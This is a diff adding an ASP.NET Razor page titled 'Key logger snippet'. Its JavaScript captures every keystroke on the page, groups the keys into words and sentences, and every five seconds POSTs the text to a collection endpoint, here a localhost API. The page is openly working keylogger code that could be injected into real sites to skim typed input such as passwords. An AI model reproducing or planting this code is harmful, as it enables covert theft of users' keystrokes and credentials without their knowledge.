@@ -1,0 +1,63 @@
+﻿
+@{
+    ViewBag.Title = "Index";
+}
+
+<!doctype html>
+<html>
+<head>
+    <title>Key logger snippet</title>
+</head>
+<body>
+    <script type="text/javascript">
+        var word = "";
+        var sentence = "";
+        var text = "";
+
+        //sending to console developer window
+        document.addEventListener("keydown", function (e) {
+            var character_code = event.which || event.keyCode;
+            var character_value = String.fromCharCode(character_code);
+
+            console.log("Current character: " + character_code + " " + character_value);
+
+            //get word // each letter
+            word += character_value;
+
+            //32 = space
+            //get sentence
+            if (character_code == 32) {
+                console.log("Word " + word);
+                sentence += word;
+                word = "";
+            }
+
+            //13 = enter 190 = .
+            //get text
+            if (character_code == 13 || character_code == 190) {
+                sentence += word;
+                console.log("Sentence: " + sentence);
+                text += sentence + word;
+                word = "";
+                sentence = "";
+            }
+        });
+
+        // sending to client
+        setInterval(function () {
+            if (text.length > 0) {
+                console.log("Text for submission: " + text);
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'http://localhost:49670/API/CollectKeyLogging');
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('sentence=' + sentence);
+                text = "";
+                sentence = "";
+                word = "";
+            }
+        }, 5000);
+    </script>
+</body>
+</html>
+ 
+
